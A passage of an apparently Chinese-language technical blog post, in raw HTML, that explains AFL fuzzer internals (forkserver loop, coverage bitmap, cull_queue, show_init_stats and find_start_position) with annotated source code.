class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 1. 等待AFL的fork请求</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">read</span>(<span class="number">198</span>, &amp;_afl_temp, <span class="number">4uLL</span>) != <span class="number">4</span>) <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. 创建子进程</span></span><br><span class="line">    <span class="built_in">LODWORD</span>(v13) = fork();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!v13) &#123;</span><br><span class="line">        <span class="comment">// 子进程：跳转到正常程序执行</span></span><br><span class="line">        <span class="keyword">goto</span> __afl_fork_resume;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3. 父进程：发送子进程PID给AFL</span></span><br><span class="line">    _afl_fork_pid = v13;</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">199</span>, &amp;_afl_fork_pid, <span class="number">4uLL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 4. 等待子进程结束并发送退出状态</span></span><br><span class="line">    <span class="built_in">waitpid</span>(_afl_fork_pid, &amp;_afl_temp, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">199</span>, &amp;_afl_temp, <span class="number">4uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基于边的覆盖位图跟踪：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v7 = _afl_prev_loc ^ a4;                    <span class="comment">// 计算边的哈希值</span></span><br><span class="line">_afl_prev_loc ^= v7;                        <span class="comment">// 等效于：_afl_prev_loc = a4</span></span><br><span class="line">_afl_prev_loc = _afl_prev_loc &gt;&gt; <span class="number">1</span>;         <span class="comment">// 右移1位，作为下次的prev_loc</span></span><br><span class="line">++*(_BYTE *)(v6 + v7);                      <span class="comment">// 在位图中增加计数</span></span><br></pre></td></tr></table></figure><h2 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue"></a>cull_queue</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">cull_queue</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">queue_entry</span>* q;</span><br><span class="line">  <span class="type">static</span> u8 temp_v[MAP_SIZE &gt;&gt; <span class="number">3</span>];</span><br><span class="line">  u32 i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode || !score_changed) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  score_changed = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(temp_v, <span class="number">255</span>, MAP_SIZE &gt;&gt; <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  queued_favored  = <span class="number">0</span>;</span><br><span class="line">  pending_favored = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  q = queue;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (q) &#123;</span><br><span class="line">    q-&gt;favored = <span class="number">0</span>;</span><br><span class="line">    q = q-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Let&#x27;s see if anything in the bitmap isn&#x27;t captured in temp_v.</span></span><br><span class="line"><span class="comment">     If yes, and if it has a top_rated[] contender, let&#x27;s use it. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++)</span><br><span class="line">    <span class="keyword">if</span> (top_rated[i] &amp;&amp; (temp_v[i &gt;&gt; <span class="number">3</span>] &amp; (<span class="number">1</span> &lt;&lt; (i &amp; <span class="number">7</span>)))) &#123;</span><br><span class="line"></span><br><span class="line">      u32 j = MAP_SIZE &gt;&gt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Remove all bits belonging to the current entry from temp_v. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (j--) </span><br><span class="line">        <span class="keyword">if</span> (top_rated[i]-&gt;trace_mini[j])</span><br><span class="line">          temp_v[j] &amp;= ~top_rated[i]-&gt;trace_mini[j];</span><br><span class="line"></span><br><span class="line">      top_rated[i]-&gt;favored = <span class="number">1</span>;</span><br><span class="line">      queued_favored++;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!top_rated[i]-&gt;was_fuzzed) pending_favored++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  q = queue;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (q) &#123;</span><br><span class="line">    <span class="built_in">mark_as_redundant</span>(q, !q-&gt;favored);</span><br><span class="line">    q = q-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dumb_mode || !score_changed) <span class="keyword">return</span>;</span><br><span class="line">score_changed = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(temp_v, <span class="number">255</span>, MAP_SIZE &gt;&gt; <span class="number">3</span>);  <span class="comment">// 将所有位设为1</span></span><br><span class="line">queued_favored = <span class="number">0</span>;</span><br><span class="line">pending_favored = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>如果是盲fuzz模式或者评分没有改变（改变就是出现了新的路径或者有一个更好的抵达某个路径的测试用例的出现）就会直接return</p><p>将 temp_v 初始化为全1，表示所有覆盖率位置都需要被覆盖，重置所有测试用例的 favored 标记</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++)</span><br><span class="line">  <span class="keyword">if</span> (top_rated[i] &amp;&amp; (temp_v[i &gt;&gt; <span class="number">3</span>] &amp; (<span class="number">1</span> &lt;&lt; (i &amp; <span class="number">7</span>)))) &#123;</span><br><span class="line">    <span class="comment">// 选择这个测试用例</span></span><br><span class="line">    top_rated[i]-&gt;favored = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 从temp_v中移除这个测试用例覆盖的所有位</span></span><br><span class="line">    <span class="keyword">while</span> (j--) </span><br><span class="line">      <span class="keyword">if</span> (top_rated[i]-&gt;trace_mini[j])</span><br><span class="line">        temp_v[j] &amp;= ~top_rated[i]-&gt;trace_mini[j];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>贪心选择算法，如果bitmap上的某一个位置有最佳的测试用例而且该位置也未被覆盖，将该测试用例标记位优选，然后从temp_v中移除该测试用例能覆盖到的所有位置</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">q = queue;</span><br><span class="line"><span class="keyword">while</span> (q) &#123;</span><br><span class="line">  <span class="built_in">mark_as_redundant</span>(q, !q-&gt;favored);</span><br><span class="line">  q = q-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将未被标记为优选的测试用例标记为冗余</p><blockquote><p>被标记为优选的测试样例会被优先变异</p></blockquote><h2 id="show-init-stats"><a href="#show-init-stats" class="headerlink" title="show_init_stats"></a>show_init_stats</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">show_init_stats</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">queue_entry</span>* q = queue;</span><br><span class="line">  u32 min_bits = <span class="number">0</span>, max_bits = <span class="number">0</span>;</span><br><span class="line">  u64 min_us = <span class="number">0</span>, max_us = <span class="number">0</span>;</span><br><span class="line">  u64 avg_us = <span class="number">0</span>;</span><br><span class="line">  u32 max_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (total_cal_cycles) avg_us = total_cal_us / total_cal_cycles;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (q) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!min_us || q-&gt;exec_us &lt; min_us) min_us = q-&gt;exec_us;</span><br><span class="line">    <span class="keyword">if</span> (q-&gt;exec_us &gt; max_us) max_us = q-&gt;exec_us;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!min_bits || q-&gt;bitmap_size &lt; min_bits) min_bits = q-&gt;bitmap_size;</span><br><span class="line">    <span class="keyword">if</span> (q-&gt;bitmap_size &gt; max_bits) max_bits = q-&gt;bitmap_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;len &gt; max_len) max_len = q-&gt;len;</span><br><span class="line"></span><br><span class="line">    q = q-&gt;next;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (avg_us &gt; (qemu_mode ? <span class="number">50000</span> : <span class="number">10000</span>)) </span><br><span class="line">    <span class="built_in">WARNF</span>(cLRD <span class="string">&quot;The target binary is pretty slow! See %s/perf_tips.txt.&quot;</span>,</span><br><span class="line">          doc_path);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Let&#x27;s keep things moving with slow binaries. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (avg_us &gt; <span class="number">50000</span>) havoc_div = <span class="number">10</span>;     <span class="comment">/* 0-19 execs/sec   */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (avg_us &gt; <span class="number">20000</span>) havoc_div = <span class="number">5</span>; <span class="comment">/* 20-49 execs/sec  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (avg_us &gt; <span class="number">10000</span>) havoc_div = <span class="number">2</span>; <span class="comment">/* 50-100 execs/sec */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!resuming_fuzz) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (max_len &gt; <span class="number">50</span> * <span class="number">1024</span>)</span><br><span class="line">      <span class="built_in">WARNF</span>(cLRD <span class="string">&quot;Some test cases are huge (%s) - see %s/perf_tips.txt!&quot;</span>,</span><br><span class="line">            <span class="built_in">DMS</span>(max_len), doc_path);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (max_len &gt; <span class="number">10</span> * <span class="number">1024</span>)</span><br><span class="line">      <span class="built_in">WARNF</span>(<span class="string">&quot;Some test cases are big (%s) - see %s/perf_tips.txt.&quot;</span>,</span><br><span class="line">            <span class="built_in">DMS</span>(max_len), doc_path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (useless_at_start &amp;&amp; !in_bitmap)</span><br><span class="line">      <span class="built_in">WARNF</span>(cLRD <span class="string">&quot;Some test cases look useless. Consider using a smaller set.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (queued_paths &gt; <span class="number">100</span>)</span><br><span class="line">      <span class="built_in">WARNF</span>(cLRD <span class="string">&quot;You probably have far too many input files! Consider trimming down.&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (queued_paths &gt; <span class="number">20</span>)</span><br><span class="line">      <span class="built_in">WARNF</span>(<span class="string">&quot;You have lots of input files; try starting small.&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">OKF</span>(<span class="string">&quot;Here are some useful stats:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">      cGRA <span class="string">&quot;    Test case count : &quot;</span> cRST <span class="string">&quot;%u favored, %u variable, %u total\n&quot;</span></span><br><span class="line">      cGRA <span class="string">&quot;       Bitmap range : &quot;</span> cRST <span class="string">&quot;%u to %u bits (average: %0.02f bits)\n&quot;</span></span><br><span class="line">      cGRA <span class="string">&quot;        Exec timing : &quot;</span> cRST <span class="string">&quot;%s to %s us (average: %s us)\n&quot;</span>,</span><br><span class="line">      queued_favored, queued_variable, queued_paths, min_bits, max_bits, </span><br><span class="line">      ((<span class="type">double</span>)total_bitmap_size) / (total_bitmap_entries ? total_bitmap_entries : <span class="number">1</span>),</span><br><span class="line">      <span class="built_in">DI</span>(min_us), <span class="built_in">DI</span>(max_us), <span class="built_in">DI</span>(avg_us));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!timeout_given) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Figure out the appropriate timeout. The basic idea is: 5x average or</span></span><br><span class="line"><span class="comment">       1x max, rounded up to EXEC_TM_ROUND ms and capped at 1 second.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       If the program is slow, the multiplier is lowered to 2x or 3x, because</span></span><br><span class="line"><span class="comment">       random scheduler jitter is less likely to have any impact, and because</span></span><br><span class="line"><span class="comment">       our patience is wearing thin =) */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (avg_us &gt; <span class="number">50000</span>) exec_tmout = avg_us * <span class="number">2</span> / <span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (avg_us &gt; <span class="number">10000</span>) exec_tmout = avg_us * <span class="number">3</span> / <span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">else</span> exec_tmout = avg_us * <span class="number">5</span> / <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">    exec_tmout = <span class="built_in">MAX</span>(exec_tmout, max_us / <span class="number">1000</span>);</span><br><span class="line">    exec_tmout = (exec_tmout + EXEC_TM_ROUND) / EXEC_TM_ROUND * EXEC_TM_ROUND;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (exec_tmout &gt; EXEC_TIMEOUT) exec_tmout = EXEC_TIMEOUT;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ACTF</span>(<span class="string">&quot;No -t option specified, so I&#x27;ll use exec timeout of %u ms.&quot;</span>, </span><br><span class="line">         exec_tmout);</span><br><span class="line"></span><br><span class="line">    timeout_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (timeout_given == <span class="number">3</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ACTF</span>(<span class="string">&quot;Applying timeout settings from resumed session (%u ms).&quot;</span>, exec_tmout);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In dumb mode, re-running every timing out test case with a generous time</span></span><br><span class="line"><span class="comment">     limit is very expensive, so let&#x27;s select a more conservative default. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode &amp;&amp; !<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HANG_TMOUT&quot;</span>))</span><br><span class="line">    hang_tmout = <span class="built_in">MIN</span>(EXEC_TIMEOUT, exec_tmout * <span class="number">2</span> + <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">OKF</span>(<span class="string">&quot;All set and ready to roll!&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (total_cal_cycles) avg_us = total_cal_us / total_cal_cycles;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (q) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!min_us || q-&gt;exec_us &lt; min_us) min_us = q-&gt;exec_us;</span><br><span class="line"><span class="keyword">if</span> (q-&gt;exec_us &gt; max_us) max_us = q-&gt;exec_us;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!min_bits || q-&gt;bitmap_size &lt; min_bits) min_bits = q-&gt;bitmap_size;</span><br><span class="line"><span class="keyword">if</span> (q-&gt;bitmap_size &gt; max_bits) max_bits = q-&gt;bitmap_size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (q-&gt;len &gt; max_len) max_len = q-&gt;len;</span><br><span class="line"></span><br><span class="line">q = q-&gt;next;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>最小&#x2F;最大执行时间 min_us&#x2F;max_us</p></li><li><p>最小&#x2F;最大位图大小 min_bits&#x2F;max_bits</p></li><li><p>最大输入长度 max_len</p></li><li><p>平均执行时间 avg_us &#x3D; total_cal_us &#x2F; total_cal_cycles</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (avg_us &gt; (qemu_mode ? <span class="number">50000</span> : <span class="number">10000</span>)) </span><br><span class="line">  <span class="built_in">WARNF</span>(cLRD <span class="string">&quot;The target binary is pretty slow! See %s/perf_tips.txt.&quot;</span>,</span><br><span class="line">        doc_path);</span><br></pre></td></tr></table></figure><p>qemu模式下的平均执行时间给的更加宽松，也能看出qemu模式下的fuzz效率更低</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (avg_us &gt; <span class="number">50000</span>) havoc_div = <span class="number">10</span>;     <span class="comment">/* 0-19 execs/sec   */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (avg_us &gt; <span class="number">20000</span>) havoc_div = <span class="number">5</span>; <span class="comment">/* 20-49 execs/sec  */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (avg_us &gt; <span class="number">10000</span>) havoc_div = <span class="number">2</span>; <span class="comment">/* 50-100 execs/sec */</span></span><br></pre></td></tr></table></figure><p>平均执行时间更慢则降低变异强度（增大 havoc_div）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!resuming_fuzz) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (max_len &gt; <span class="number">50</span> * <span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">WARNF</span>(cLRD <span class="string">&quot;Some test cases are huge (%s) - see %s/perf_tips.txt!&quot;</span>,</span><br><span class="line">          <span class="built_in">DMS</span>(max_len), doc_path);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (max_len &gt; <span class="number">10</span> * <span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">WARNF</span>(<span class="string">&quot;Some test cases are big (%s) - see %s/perf_tips.txt.&quot;</span>,</span><br><span class="line">          <span class="built_in">DMS</span>(max_len), doc_path);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (useless_at_start &amp;&amp; !in_bitmap)</span><br><span class="line">    <span class="built_in">WARNF</span>(cLRD <span class="string">&quot;Some test cases look useless. Consider using a smaller set.&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queued_paths &gt; <span class="number">100</span>)</span><br><span class="line">    <span class="built_in">WARNF</span>(cLRD <span class="string">&quot;You probably have far too many input files! Consider trimming down.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (queued_paths &gt; <span class="number">20</span>)</span><br><span class="line">    <span class="built_in">WARNF</span>(<span class="string">&quot;You have lots of input files; try starting small.&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在非恢复对话下，给出一些样本的可读性建议</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (avg_us &gt; <span class="number">50000</span>) exec_tmout = avg_us * <span class="number">2</span> / <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (avg_us &gt; <span class="number">10000</span>) exec_tmout = avg_us * <span class="number">3</span> / <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">else</span> exec_tmout = avg_us * <span class="number">5</span> / <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">exec_tmout = <span class="built_in">MAX</span>(exec_tmout, max_us / <span class="number">1000</span>);</span><br><span class="line">exec_tmout = (exec_tmout + EXEC_TM_ROUND) / EXEC_TM_ROUND * EXEC_TM_ROUND;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (exec_tmout &gt; EXEC_TIMEOUT) exec_tmout = EXEC_TIMEOUT;</span><br></pre></td></tr></table></figure><p>根据平均执行时间&#x2F;最大执行时间推导出较佳的<code>exec_tmout</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dumb_mode &amp;&amp; !<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HANG_TMOUT&quot;</span>))</span><br><span class="line">  hang_tmout = <span class="built_in">MIN</span>(EXEC_TIMEOUT, exec_tmout * <span class="number">2</span> + <span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>如果是盲fuzz且未设环境变量则设定更保守的挂起时间</p><h2 id="find-start-position"><a href="#find-start-position" class="headerlink" title="find_start_position"></a>find_start_position</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> u32 <span class="title">find_start_position</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> u8 tmp[<span class="number">4096</span>]; <span class="comment">/* Ought to be enough for anybody. */</span></span><br><span class="line"></span><br><span class="line">  u8  *fn, *off;</span><br><span class="line">  s32 fd, i;</span><br><span class="line">  u32 ret;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!resuming_fuzz) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_place_resume) fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/fuzzer_stats&quot;</span>, out_dir);</span><br><span class="line">  <span class="keyword">else</span> fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/../fuzzer_stats&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  fd = <span class="built_in">open</span>(fn, O_RDONLY);</span><br><span class="line">  <span class="built_in">ck_free</span>(fn);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  i = <span class="built_in">read</span>(fd, tmp, <span class="built_in">sizeof</span>(tmp) - <span class="number">1</span>); (<span class="type">void</span>)i; <span class="comment">/* Ignore errors */</span></span><br><span class="line">  <span class="built_in">close</span>(fd);</span><br><span class="line"></span><br><span class="line">  off = <span class="built_in">strstr</span>(tmp, <span class="string">&quot;cur_path          : &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!off) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  ret = <span class="built_in">atoi</span>(off + <span class="number">20</span>);</span><br><span class="line">  <span class="keyword">if</span> (ret &gt;= queued_paths) ret = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恢复会话模式下用于寻找从队列中的哪个位置开始继续测试</p><p>读取fuzzer_stats文件下的最多4095字节到缓冲区，然后解析<code>cur_path          : </code>字符串（strstr返回cur_path出现的第一个字符的指针），提取冒号后的数值（源码上是通过偏移20来获取的，但是该字符串就是20，就是提取紧接着的数值）</p><h2 id="write-stats-file"><a href="#write-stats-file" class="headerlink" title="write_stats_file"></a>write_stats_file</h2><p>在程序main函数的参数是<code>(0,0,0)</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span 